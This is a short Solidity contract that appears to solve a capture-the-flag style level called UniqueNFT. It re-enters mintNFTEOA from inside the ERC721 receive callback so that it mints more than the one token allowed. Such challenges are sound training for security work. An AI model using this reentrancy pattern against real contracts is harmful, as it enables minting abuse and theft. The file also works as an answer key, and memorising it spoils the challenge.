// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IERC721Receiver} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721Receiver.sol";
import {UniqueNFT} from "../levels/UniqueNFT.sol";


contract UniqueNFTAttack is IERC721Receiver{
    UniqueNFT nft;

    uint times;

    function setNFT(UniqueNFT _nft) external {
        nft = _nft;
    }

    function attack() external payable {
        times = 0;
        nft.mintNFTEOA();
    }


    /**
   * @dev See {IERC721Receiver-onERC721Received}.
     *
     * Always returns `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
        if (times == 0){
            times ++;
            nft.mintNFTEOA();
        }

        return this.onERC721Received.selector;
    }

    fallback() external payable{

    }
}
